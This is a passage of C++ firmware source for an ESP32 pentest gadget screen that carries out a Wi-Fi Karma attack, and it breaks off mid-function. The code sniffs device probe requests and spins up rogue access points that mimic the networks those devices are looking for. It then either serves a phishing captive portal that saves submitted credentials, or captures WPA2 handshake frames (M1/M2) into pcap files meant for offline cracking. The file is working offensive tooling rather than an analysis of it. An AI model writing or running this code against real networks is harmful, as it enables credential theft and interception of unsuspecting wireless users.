#include "WifiKarmaScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputNumberAction.h"
#include "ui/actions/InputSelectOption.h"
#include "utils/StorageUtil.h"
#include "utils/network/KarmaEspNow.h"

#include <WiFi.h>
#include <esp_now.h>
#include <esp_system.h>

WifiKarmaScreen* WifiKarmaScreen::_instance = nullptr;

WifiKarmaScreen::EapolCapture WifiKarmaScreen::_eapolRing[WifiKarmaScreen::EAPOL_RING_SIZE] = {};
volatile int  WifiKarmaScreen::_eapolHead    = 0;
volatile int  WifiKarmaScreen::_eapolTail    = 0;
volatile bool WifiKarmaScreen::_capturingEapol = false;
uint8_t       WifiKarmaScreen::_ourBssid[6]  = {};
char          WifiKarmaScreen::_eapolSavePath[128] = {};
const uint8_t WifiKarmaScreen::_broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// ── PCAP structs ─────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct KarmaPcapGlobalHdr {
  uint32_t magic    = 0xA1B2C3D4;
  uint16_t vmaj     = 2;
  uint16_t vmin     = 4;
  int32_t  tz       = 0;
  uint32_t sig      = 0;
  uint32_t snap     = 65535;
  uint32_t linktype = 105;  // LINKTYPE_IEEE802_11
};
struct KarmaPcapPktHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};
#pragma pack(pop)

// ── Destructor ──────────────────────────────────────────────────────────────

WifiKarmaScreen::~WifiKarmaScreen()
{
  _stopAttack();
  _instance = nullptr;
}

// ── Callbacks ───────────────────────────────────────────────────────────────

void WifiKarmaScreen::_onVisit(void* ctx)
{
  auto* self = static_cast<WifiKarmaScreen*>(ctx);
  self->_log.addLine("[+] Portal visited");
}

void WifiKarmaScreen::_onPost(const String& data, void* ctx)
{
  auto* self = static_cast<WifiKarmaScreen*>(ctx);
  self->_log.addLine("[+] Credential captured!", TFT_GREEN);

  String ssid = (self->_currentSsid[0] != '\0') ? String(self->_currentSsid) : "unknown";
  self->_portal.saveCaptured(data, "karma_" + ssid);
  self->_inputStartTime = millis();
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiKarmaScreen::onInit()
{
  _instance = this;
  _showMenu();
}

void WifiKarmaScreen::onItemSelected(uint8_t index)
{
  if (_state != STATE_MENU) return;
  switch (index) {
    case 0: { // Mode toggle — rebuilds entire menu for the new mode
      _karmaMode = (_karmaMode == MODE_CAPTIVE) ? MODE_EAPOL : MODE_CAPTIVE;
      _showMenu();
      break;
    }
    case 1: { // Save WiFi List (same for both modes)
      _saveList = !_saveList;
      _saveListSub = _saveList ? "On" : "Off";
      _menuItems[1].sublabel = _saveListSub.c_str();
      render();
      break;
    }
    case 2: {
      if (_karmaMode == MODE_CAPTIVE) {
        // Captive Portal selection
        _state = STATE_SELECT_PORTAL;
        if (_portal.selectPortal()) {
          _showMenu();
        } else {
          _state = STATE_MENU;
          render();
        }
      } else {
        // EAPOL: Waiting Time
        int val = InputNumberAction::popup("Wait Connect (s)", 5, 120, _waitConnect);
        if (val >= 5) _waitConnect = val;
        _showMenu();
      }
      break;
    }
    case 3: {
      if (_karmaMode == MODE_CAPTIVE) {
        // Captive: Waiting Time
        int val = InputNumberAction::popup("Wait Connect (s)", 5, 120, _waitConnect);
        if (val >= 5) _waitConnect = val;
        _showMenu();
      } else {
        // EAPOL: Support Device — toggle pair/clear
        if (_hasSupportDevice) {
          _hasSupportDevice = false;
          memset(_supportMac, 0, 6);
          _supportDevSub = "None";
          _menuItems[3].sublabel = _supportDevSub.c_str();
          render();
        } else {
          _startPairScan();
        }
      }
      break;
    }
    case 4: {
      if (_karmaMode == MODE_CAPTIVE) {
        // Captive: Wait Input
        int val = InputNumberAction::popup("Captive Wait Input (s)", 10, 600, _waitInput);
        if (val >= 10) _waitInput = val;
        _showMenu();
      } else {
        // EAPOL: Start
        _startAttack();
      }
      break;
    }
    case 5: {
      // Captive only: Start
      _startAttack();
      break;
    }
  }
}

void WifiKarmaScreen::onUpdate()
{
  // ── Pair scan state ────────────────────────────────────────────────────────
  if (_state == STATE_PAIR_SCAN) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
        esp_now_unregister_recv_cb();
        esp_now_deinit();
        WiFi.mode(WIFI_OFF);
        _hasSupportDevice = false;
        _showMenu();
        return;
      }
    }

    unsigned long now = millis();

    if (now - _pairScanStart <= PAIR_SCAN_MS) {
      if (now - _lastDraw > 300) { render(); _lastDraw = now; }
      return;
    }

    // Scan window complete — stop listening
    esp_now_unregister_recv_cb();

    if (_pairDeviceCount == 0) {
      // No devices found — show briefly then go back
      render();
      delay(1000);
      esp_now_deinit();
      WiFi.mode(WIFI_OFF);
      _hasSupportDevice = false;
      _showMenu();
      return;
    }

    if (_pairDeviceCount == 1) {
      // Single device — auto-select
      memcpy(_supportMac, _pairDevices[0], 6);
      _hasSupportDevice = true;
      _pairFound        = true;
    } else {
      // Multiple devices — let user pick
      char macBufs[MAX_PAIR_DEVICES][18];
      InputSelectAction::Option opts[MAX_PAIR_DEVICES];
      for (int i = 0; i < _pairDeviceCount; i++) {
        snprintf(macBufs[i], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
                 _pairDevices[i][0], _pairDevices[i][1], _pairDevices[i][2],
                 _pairDevices[i][3], _pairDevices[i][4], _pairDevices[i][5]);
        opts[i] = { macBufs[i], macBufs[i] };
      }
      const char* selected = InputSelectAction::popup("Select Device", opts, _pairDeviceCount);
      if (selected) {
        for (int i = 0; i < _pairDeviceCount; i++) {
          if (strcmp(macBufs[i], selected) == 0) {
            memcpy(_supportMac, _pairDevices[i], 6);
            _hasSupportDevice = true;
            _pairFound        = true;
            break;
          }
        }
      }
    }

    esp_now_deinit();
    WiFi.mode(WIFI_OFF);
    _showMenu();
    return;
  }

  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // ── Handle exit ────────────────────────────────────────────────────────────
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // ── DNS / EAPOL flush ──────────────────────────────────────────────────────
  if (_karmaMode == MODE_CAPTIVE) {
    _portal.processDns();
  } else {
    _flushEapol();
  }

  unsigned long now = millis();

  // ── Support mode: wait for KARMA_ACK ──────────────────────────────────────
  if (_karmaMode == MODE_EAPOL && _waitingForAck) {
    bool ack;
    uint8_t ackBssid[6];
    portENTER_CRITICAL(&_espNowLock);
    ack = _ackReceived;
    memcpy(ackBssid, _ackBssid, 6);
    portEXIT_CRITICAL(&_espNowLock);

    if (ack) {
      _waitingForAck = false;
      _ackReceived   = false;
      _buildEapolPath(ackBssid, _pendingSsid);
      _startEapolCapture();
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      _apActive        = true;
      _apStartTime     = now;
      _clientConnected = false;
      char buf[60];
      snprintf(buf, sizeof(buf), "[+] AP ready: %.20s (%ds)", _pendingSsid, _waitConnect);
      _log.addLine(buf, TFT_GREEN);
    } else if (now > _ackTimeout) {
      _waitingForAck = false;
      char buf[60];
      snprintf(buf, sizeof(buf), "[!] ACK timeout: %.20s", _pendingSsid);
      _log.addLine(buf, TFT_RED);
      _blacklistSSID(_pendingSsid);
      _capturingEapol = false;
      esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);
      esp_wifi_set_promiscuous(true);
    } else {
      if (now - _lastDraw > 500) { render(); _lastDraw = now; }
      return;
    }
  }

  // ── AP active logic ────────────────────────────────────────────────────────
  if (_apActive) {
    if (_karmaMode == MODE_CAPTIVE) {
      int clients = WiFi.softAPgetStationNum();
      if (clients > 0 && !_clientConnected) {
        _clientConnected = true;
        _inputStartTime = now;
        char buf[60];
        snprintf(buf, sizeof(buf), "[+] Client connected to: %s", _currentSsid);
        _log.addLine(buf, TFT_GREEN);
      }
      if (!_clientConnected) {
        if (now - _apStartTime > (unsigned long)_waitConnect * 1000) {
          char buf[60];
          snprintf(buf, sizeof(buf), "[-] Timeout: %s", _currentSsid);
          _log.addLine(buf);
          _blacklistSSID(_currentSsid);
          _teardownAP();
        }
      } else {
        if (now - _inputStartTime > (unsigned long)_waitInput * 1000) {
          char buf[60];
          snprintf(buf, sizeof(buf), "[-] Input timeout: %s", _currentSsid);
          _log.addLine(buf);
          _blacklistSSID(_currentSsid);
          _teardownAP();
        }
      }
    } else {
      // EAPOL mode — wait for timeout then rotate to next queued SSID
      if (now - _apStartTime > (unsigned long)_waitConnect * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Timeout: %s", _currentSsid);
        _log.addLine(buf);
        _blacklistSSID(_currentSsid);
        _capturingEapol  = false;
        _flushEapol();
        _apActive        = false;
        _clientConnected = false;
      }
    }
  }

  // ── Deploy next queued SSID ────────────────────────────────────────────────
  if (!_apActive && !_waitingForAck) {
    while (_queueHead != _queueTail) {
      int head = _queueHead;
      _queueHead = (_queueHead + 1) % MAX_SSIDS;
      if (!_isBlacklisted(_probeQueue[head])) {
        _deployAP(_probeQueue[head], now);
        break;
      }
    }
  }

  // ── Redraw ─────────────────────────────────────────────────────────────────
  if (now - _lastDraw > 500) {
    render();
    _lastDraw = now;
  }
}

void WifiKarmaScreen::onRender()
{
  if (_state == STATE_RUNNING)   { _drawLog();      return; }
  if (_state == STATE_PAIR_SCAN) { _drawPairScan(); return; }
  ListScreen::onRender();
}

void WifiKarmaScreen::onBack()
{
  if (_state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Menu ────────────────────────────────────────────────────────────────────

void WifiKarmaScreen::_showMenu()
{
  _state          = STATE_MENU;
  _modeSub        = (_karmaMode == MODE_EAPOL) ? "Eapol" : "Captive";
  _saveListSub    = _saveList ? "On" : "Off";
  _waitConnectSub = String(_waitConnect) + "s";

  if (_karmaMode == MODE_CAPTIVE) {
    _portalSub    = _portal.portalFolder().isEmpty() ? "-" : _portal.portalFolder();
    _waitInputSub = String(_waitInput) + "s";

    _menuItems[0] = {"Mode",           _modeSub.c_str()};
    _menuItems[1] = {"Save WiFi List", _saveListSub.c_str()};
    _menuItems[2] = {"Captive Portal", _portalSub.c_str()};
    _menuItems[3] = {"Waiting Time",   _waitConnectSub.c_str()};
    _menuItems[4] = {"Wait Input",     _waitInputSub.c_str()};
    _menuItems[5] = {"Start"};
    setItems(_menuItems, 6);
  } else {
    if (_hasSupportDevice) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               _supportMac[0], _supportMac[1], _supportMac[2],
               _supportMac[3], _supportMac[4], _supportMac[5]);
      _supportDevSub = String(mac);
    } else {
      _supportDevSub = "None";
    }

    _menuItems[0] = {"Mode",           _modeSub.c_str()};
    _menuItems[1] = {"Save WiFi List", _saveListSub.c_str()};
    _menuItems[2] = {"Waiting Time",   _waitConnectSub.c_str()};
    _menuItems[3] = {"Support Device", _supportDevSub.c_str()};
    _menuItems[4] = {"Start"};
    setItems(_menuItems, 5);
  }
}

// ── Probe Sniffer ───────────────────────────────────────────────────────────

void WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (!_instance) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  const uint16_t len   = (uint16_t)pkt->rx_ctrl.sig_len;

  // ── EAPOL capture (runs while AP is active) ───────────────────────────────
  // Does NOT return early — probe sniffing below always runs so the queue keeps
  // growing even while we are waiting on the current target AP.
  if (_instance->_capturingEapol &&
      (type == WIFI_PKT_DATA || type == WIFI_PKT_MGMT) &&
      len >= 30 && len <= EAPOL_MAX_FRAME) {

    bool isEapol  = false;
    bool isBeacon = (type == WIFI_PKT_MGMT && len >= 36 &&
                     (frame[0] & 0xFC) == 0x80);  // subtype=8

    if (!isBeacon) {
      static const uint8_t snap[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
      for (uint16_t i = 24; i + 8 <= len; i++) {
        bool match = true;
        for (int k = 0; k < 8; k++) if (frame[i+k] != snap[k]) { match = false; break; }
        if (match) { isEapol = true; break; }
      }
    }

    if (isEapol || isBeacon) {
      int next = (_eapolHead + 1) % EAPOL_RING_SIZE;
      if (next != _eapolTail) {  // ring not full — buffer frame
        uint16_t copyLen = len > EAPOL_MAX_FRAME ? EAPOL_MAX_FRAME : len;
        memcpy(_eapolRing[_eapolHead].data, frame, copyLen);
        _eapolRing[_eapolHead].len = copyLen;
        _eapolHead = next;
      }
    }
    // fall through — probe sniffing below must always run
  }

  // ── Probe request sniffing (always runs — queues SSIDs for future deploys) ─
  if (type != WIFI_PKT_MGMT) return;
  if (len < 28) return;
  if (frame[0] != 0x40) return;  // probe request subtype

  uint8_t ssidLen = frame[25];
  if (ssidLen < 1 || ssidLen > 32) return;

  char ssid[33];
  memcpy(ssid, &frame[26], ssidLen);
  ssid[ssidLen] = '\0';

  bool allSpace = true;
  for (int i = 0; i < ssidLen; i++) {
    if (ssid[i] != ' ') { allSpace = false; break; }
  }
  if (allSpace) return;

  _instance->_onProbe(ssid);
}

void WifiKarmaScreen::_onProbe(const char* ssid)
{
  if (_isBlacklisted(ssid)) return;

  // Skip if already in current queue
  for (int i = _queueHead; i != _queueTail; i = (i + 1) % MAX_SSIDS) {
    if (strcmp(_probeQueue[i], ssid) == 0) return;
  }
  // Skip if this SSID is currently deployed
  if (_apActive && strcmp(_currentSsid, ssid) == 0) return;

  int nextTail = (_queueTail + 1) % MAX_SSIDS;
  if (nextTail == _queueHead) return;  // queue full

  strncpy(_probeQueue[_queueTail], ssid, 32);
  _probeQueue[_queueTail][32] = '\0';
  _queueTail = nextTail;
  _capturedCount++;

  char buf[60];
  snprintf(buf, sizeof(buf), "[*] Probe: %s", ssid);
  _log.addLine(buf);

  if (_saveList) _saveSSIDToFile(ssid);
}

void WifiKarmaScreen::_startSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(200);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);

  _log.addLine("[*] Sniffing probes...");
}

void WifiKarmaScreen::_stopSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

// ── AP Deployment ───────────────────────────────────────────────────────────

void WifiKarmaScreen::_deployAP(const char* ssid, unsigned long now)
{
  strncpy(_currentSsid, ssid, 32);
  _currentSsid[32] = '\0';

  if (_karmaMode == MODE_EAPOL) {
    // EAPOL always uses the support device — generate a random WPA2 password
    // and send KARMA_DEPLOY.  The support device hosts the AP; this device stays
    // in light promiscuous mode so ESP-NOW + EAPOL capture remain uninterrupted.
    char pass[9] = {};
    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    uint32_t r = esp_random();
    for (int i = 0; i < 8; i++) {
      if (i == 4) r ^= esp_random();
      pass[i] = alphanum[r % 36];
      r >>= 5;
    }
    _sendDeploy(ssid, pass);
    _waitingForAck  = true;
    _ackReceived    = false;
    _ackTimeout     = millis() + 1500;
    strncpy(_pendingSsid, ssid, 32);
    _pendingSsid[32] = '\0';
    _apActive        = false;
    _clientConnected = false;
    char buf[60];
    snprintf(buf, sizeof(buf), "[>] Deploying: %.20s...", ssid);
    _log.addLine(buf);
    return;  // rest handled in onUpdate() when ACK arrives
  }

  // Captive mode: deploy AP locally
  _stopSniffing();
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, NULL, 1, 0, 4);
  delay(100);
  IPAddress apIP = WiFi.softAPIP();
  if (!_portal.server()) _portal.start(apIP);

  _apActive        = true;
  _apStartTime     = now;
  _clientConnected = false;

  char buf[60];
  snprintf(buf, sizeof(buf), "[>] AP: %.20s (%ds)", ssid, _waitConnect);
  _log.addLine(buf);
}

void WifiKarmaScreen::_teardownAP()
{
  // Captive mode only — EAPOL rotates APs via a fresh KARMA_DEPLOY (no teardown between SSIDs).
  _portal.stop();
  WiFi.softAPdisconnect(true);
  _startSniffing();
  _apActive        = false;
  _clientConnected = false;
}

// ── Start / Stop ────────────────────────────────────────────────────────────

void WifiKarmaScreen::_startAttack()
{
  if (_karmaMode == MODE_CAPTIVE && _portal.portalFolder().isEmpty()) {
    ShowStatusAction::show("Select a portal first!");
    return;
  }
  if (_karmaMode == MODE_EAPOL && !_hasSupportDevice) {
    ShowStatusAction::show("Pair a Support Device first!");
    return;
  }
  if (!StorageUtil::hasSpace()) {
    ShowStatusAction::show("Storage full! (<20KB free)");
    return;
  }
  if (_karmaMode == MODE_EAPOL) {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) {
      ShowStatusAction::show("No storage available.");
      return;
    }
    Uni.Storage->makeDir("/unigeek/wifi/eapol/karma");
  }

  _state = STATE_RUNNING;
  _log.clear();
  _queueHead      = 0;
  _queueTail      = 0;
  memset(_currentSsid, 0, sizeof(_currentSsid));
  _blacklistCount = 0;
  _capturedCount  = 0;
  _eapolCaptured  = 0;
  _apActive       = false;
  _waitingForAck  = false;
  _lastDraw       = 0;
  _pcapStarted    = false;
  _eapolHasM1     = false;
  _beaconSaved    = false;

  if (_karmaMode == MODE_CAPTIVE) {
    _portal.setCallbacks(_onVisit, _onPost, this);
    _portal.loadPortalHtml();
    if (_portal.portalHtml().isEmpty()) {
      ShowStatusAction::show("Portal HTML not found!");
      _state = STATE_MENU;
      return;
    }
    _log.addLine("[*] Karma Attack started");
    _log.addLine("[*] BACK/Press to stop");
    _startSniffing();
  } else {
    // EAPOL mode always uses a paired support device (enforced above).
    // Stay in light promiscuous mode alongside ESP-NOW — no full WiFi reinit.
    _log.addLine("[*] Karma EAPOL started");
    _log.addLine("[*] BACK/Press to stop");
    _initEspNow();
    _startSniffingLight();
  }

  _drawLog();
}

void WifiKarmaScreen::_stopAttack()
{
  _capturingEapol = false;
  _waitingForAck  = false;

  if (_karmaMode == MODE_EAPOL) {
    // EAPOL always uses the support device
    _stopSniffing();
    _flushEapol();
    _sendTeardown();
    _sendDone();
    _deinitEspNow();
  } else {
    _stopSniffing();
    _portal.reset();
    WiFi.softAPdisconnect(true);
  }
  WiFi.mode(WIFI_OFF);

  _apActive        = false;
  _clientConnected = false;
  _queueHead       = 0;
  _queueTail       = 0;
  _blacklistCount  = 0;
}

// ── Save to file ────────────────────────────────────────────────────────────

void WifiKarmaScreen::_saveSSIDToFile(const char* ssid)
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  if (!StorageUtil::hasSpace()) {
    _log.addLine("[!] Storage full, skip save", TFT_RED);
    return;
  }

  Uni.Storage->makeDir("/unigeek/wifi/captives");
  String path = "/unigeek/wifi/captives/karma_ssid.txt";

  char line[80];
  struct tm timeinfo;
  if (getLocalTime(&timeinfo, 0)) {
    char ts[20];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &timeinfo);
    snprintf(line, sizeof(line), "%s:%s", ts, ssid);
  } else {
    snprintf(line, sizeof(line), "%lu:%s", millis() / 1000, ssid);
  }

  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
  if (f) {
    f.println(line);
    f.close();
  }
}

// ── Blacklist ───────────────────────────────────────────────────────────────

bool WifiKarmaScreen::_isBlacklisted(const char* ssid)
{
  for (int i = 0; i < _blacklistCount; i++) {
    if (strcmp(_blacklist[i], ssid) == 0) return true;
  }
  return false;
}

void WifiKarmaScreen::_blacklistSSID(const char* ssid)
{
  if (_blacklistCount >= MAX_SSIDS) return;
  strncpy(_blacklist[_blacklistCount], ssid, 32);
  _blacklist[_blacklistCount][32] = '\0';
  _blacklistCount++;
}

// ── Log Display ─────────────────────────────────────────────────────────────

void WifiKarmaScreen::_drawLog()
{
  auto* self = this;
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](TFT_eSprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<WifiKarmaScreen*>(ud);
      sp.setTextColor(TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char stats[40];
      if (s->_karmaMode == MODE_EAPOL) {
        snprintf(stats, sizeof(stats), "AP:%d E:%d", s->_capturedCount, s->_eapolCaptured);
      } else {
        snprintf(stats, sizeof(stats), "AP:%d V:%d P:%d",
                 s->_capturedCount, s->_portal.visitCount(), s->_portal.postCount());
      }
      sp.drawString(stats, 2, barY, 1);
      sp.setTextDatum(TR_DATUM);
      if (s->_apActive && s->_currentSsid[0] != '\0') {
        sp.drawString(String(s->_currentSsid).substring(0, 14), w - 2, barY, 1);
      } else {
        sp.drawString("Sniffing...", w - 2, barY, 1);
      }
    }, self);
}

// ── EAPOL capture helpers ────────────────────────────────────────────────────

// Returns 1=M1, 2=M2, 0=other/unknown.  Ignores M3/M4.
static int _karmaParseEapolMsg(const uint8_t* frm, uint16_t len)
{
  static const uint8_t snap[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) if (frm[i+k] != snap[k]) { match = false; break; }
    if (!match) continue;
    const uint8_t* e = frm + i + 8;
    if (len < i + 8 + 49u) return 0;
    if (e[1] != 0x03 || e[4] != 0x02) return 0;   // must be EAPOL-Key, RSN
    uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
    bool     ack = (ki & 0x0080) != 0;
    bool     mic = (ki & 0x0100) != 0;
    bool     ins = (ki & 0x0040) != 0;
    if (ack && !mic) return 1;                      // M1
    if (!ack && mic && !ins) {
      bool nonceZero = true;
      for (int z = 0; z < 32; z++) if (e[17+z]) { nonceZero = false; break; }
      return nonceZero ? 0 : 2;                     // 0=M4, 2=M2
    }
    return 0;                                       // M3 or unknown — ignore
  }
  return 0;
}

void WifiKarmaScreen::_writePcapHeader(const char* path)
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  fs::File f = Uni.Storage->open(path, FILE_WRITE);
  if (!f) return;
  KarmaPcapGlobalHdr hdr;
  f.write(reinterpret_cast<uint8_t*>(&hdr), sizeof(hdr));
  f.close();
}

void WifiKarmaScreen::_appendEapolFrame(const uint8_t* data, uint16_t len)
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  if (_eapolSavePath[0] == '\0') return;
  fs::File f = Uni.Storage->open(_eapolSavePath, FILE_APPEND);
  if (!f) return;
  KarmaPcapPktHdr ph;
  const unsigned long ms = millis();
  ph.ts_sec   = ms / 1000;
  ph.ts_usec  = (ms % 1000) * 1000;
  ph.incl_len = len;
  ph.orig_len = len;
  f.write(reinterpret_cast<uint8_t*>(&ph), sizeof(ph));
  f.write(data, len);
  f.close();
  _eapolCaptured++;
}

void WifiKarmaScreen::_flushEapol()
{
  while (_eapolTail != _eapolHead) {
    const EapolCapture& c = _eapolRing[_eapolTail];
    _eapolTail = (_eapolTail + 1) % EAPOL_RING_SIZE;

    // Beacon: buffer the first one for PCAP context
    bool isBeacon = (c.len >= 36 && (c.data[0] & 0xFC) == 0x80);
    if (isBeacon) {
      if (!_beaconSaved && c.len <= EAPOL_MAX_FRAME) {
        memcpy(_beaconBuf, c.data, c.len);
        _beaconBufLen = c.len;
        _beaconSaved  = true;
      }
      continue;
    }

    int msg = _karmaParseEapolMsg(c.data, c.len);
    if (msg == 0) continue;   // not M1 or M2 — skip

    if (msg == 1) {
      // M1 from our AP — buffer it (may or may not be captured by promiscuous)
      if (!_eapolHasM1 && c.len <= EAPOL_MAX_FRAME) {
        memcpy(_m1Buf, c.data, c.len);
        _m1BufLen   = c.len;
        _eapolHasM1 = true;
        _log.addLine("[*] M1 (ANonce)", TFT_YELLOW);
      }

    } else if (msg == 2) {
      // M2 from client — only valid if M1 (ANonce) was captured first.
      // Without M1 the handshake is incomplete and cannot be brute-forced.
      if (!_eapolHasM1) {
        if (!_pcapStarted) {  // log once per AP session, not on every retransmission
          _log.addLine("[-] M2 w/o M1, skip", TFT_DARKGREY);
        }
      } else {
        if (!_pcapStarted) {
          _writePcapHeader(_eapolSavePath);
          if (_beaconSaved) _appendEapolFrame(_beaconBuf, _beaconBufLen);
          _appendEapolFrame(_m1Buf, _m1BufLen);
          _appendEapolFrame(c.data, c.len);  // M2 — written before flag is set
          _pcapStarted = true;               // only true once M1+M2 are both on disk
          _log.addLine("[+] M1+M2 saved!", TFT_GREEN);
          if (Uni.Speaker) Uni.Speaker->beep();
        } else {
          _appendEapolFrame(c.data, c.len);  // additional M2 retransmissions
        }
      }
    }
  }
}

// ── Light sniffer (probe only, no reinit — for support+EAPOL mode) ──────────

void WifiKarmaScreen::_startSniffingLight()
{
  _capturingEapol = false;
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);
  esp_wifi_set_promiscuous(true);
  _log.addLine("[*] Sniffing probes...");
}

// ── EAPOL path helpers ────────────────────────────────────────────────────────

void WifiKarmaScreen::_buildEapolPath(const uint8_t* bssid, const char* ssid)
{
  char bssidStr[13];
  snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  char sanitized[48] = {};
  for (int i = 0, j = 0; ssid[i] && j < 47; i++) {
    char c = ssid[i];
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') || c == '-' || c == '.') {
      sanitized[j++] = c;
    } else {
      sanitized[j++] = '_';
    }
  }
  if (sanitized[0] == '\0') { sanitized[0] = 'u'; sanitized[1] = '\0'; }
  snprintf(_eapolSavePath, sizeof(_eapolSavePath),
           "/unigeek/wifi/eapol/karma/%s_%s.pcap", bssidStr, sanitized);
}

void WifiKarmaScreen::_startEapolCapture()
{
  _eapolHasM1   = false;
  _beaconSaved  = false;
  _pcapStarted  = false;
  _m1BufLen     = 0;
  _beaconBufLen = 0;
  _eapolHead    = 0;
  _eapolTail    = 0;
  _capturingEapol = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);
}

// ── ESP-NOW helpers ───────────────────────────────────────────────────────────

void WifiKarmaScreen::_initEspNow()
{
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);  // must match support device channel

  if (esp_now_init() != ESP_OK) {
    _log.addLine("[!] ESP-NOW init failed");
    return;
  }

  if (!esp_now_is_peer_exist(_broadcast)) {
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, _broadcast, 6);
    peer.channel = 1;
    peer.encrypt = false;
    esp_now_add_peer(&peer);
  }
  if (_hasSupportDevice && !esp_now_is_peer_exist(_supportMac)) {
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, _supportMac, 6);
    peer.channel = 1;
    peer.encrypt = false;
    esp_now_add_peer(&peer);
  }
  esp_now_register_recv_cb(_onEspNowRecv);
}

void WifiKarmaScreen::_deinitEspNow()
{
  esp_now_unregister_recv_cb();
  esp_now_deinit();
}

// ── Pair scan ────────────────────────────────────────────────────────────────

void WifiKarmaScreen::_startPairScan()
{
  _state           = STATE_PAIR_SCAN;
  _pairFound       = false;
  _pairDeviceCount = 0;
  _pairScanStart   = millis();
  _lastDraw        = 0;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);  // must match support device channel

  if (esp_now_init() != ESP_OK) {
    _showMenu();
    return;
  }
  if (!esp_now_is_peer_exist(_broadcast)) {
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, _broadcast, 6);
    peer.channel = 1;
    peer.encrypt = false;
    esp_now_add_peer(&peer);
  }
  esp_now_register_recv_cb(_onEspNowRecv);
  render();
}

void WifiKarmaScreen::_drawPairScan()
{
  TFT_eSprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);
  sp.setTextSize(1);
  sp.setTextDatum(MC_DATUM);

  unsigned long elapsed   = millis() - _pairScanStart;
  int           remaining = (elapsed < PAIR_SCAN_MS)
                            ? (int)((PAIR_SCAN_MS - elapsed) / 1000) + 1
                            : 0;

  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[32];
  snprintf(buf, sizeof(buf), "Scanning... %ds", remaining);
  sp.drawString(buf, bodyW() / 2, bodyH() / 2 - 16);

  if (_pairDeviceCount > 0) {
    sp.setTextColor(TFT_GREEN, TFT_BLACK);
    char devBuf[24];
    snprintf(devBuf, sizeof(devBuf), "%d device(s) found", _pairDeviceCount);
    sp.drawString(devBuf, bodyW() / 2, bodyH() / 2);

    // Show first device MAC as preview
    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             _pairDevices[0][0], _pairDevices[0][1], _pairDevices[0][2],
             _pairDevices[0][3], _pairDevices[0][4], _pairDevices[0][5]);
    sp.drawString(mac, bodyW() / 2, bodyH() / 2 + 14);

    if (_pairDeviceCount > 1) {
      sp.setTextColor(TFT_CYAN, TFT_BLACK);
